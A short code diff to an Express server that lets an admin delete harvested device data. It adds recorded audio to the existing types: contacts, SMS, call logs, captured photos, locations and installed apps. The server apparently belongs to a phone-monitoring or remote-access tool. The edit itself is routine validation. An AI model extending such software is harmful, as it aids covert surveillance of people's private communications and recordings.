@@ -1022,7 +1022,7 @@ app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, asyn
 app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
   try {
     const { deviceId, dataType } = req.params;
-    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations', 'installedApps', 'lastPhoto'].includes(dataType)) {
+    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations', 'installedApps', 'lastPhoto', 'recordedAudios'].includes(dataType)) {
       return res.status(400).json({ error: 'Invalid data type' });
     }
     const adminId = getAdminId(req);
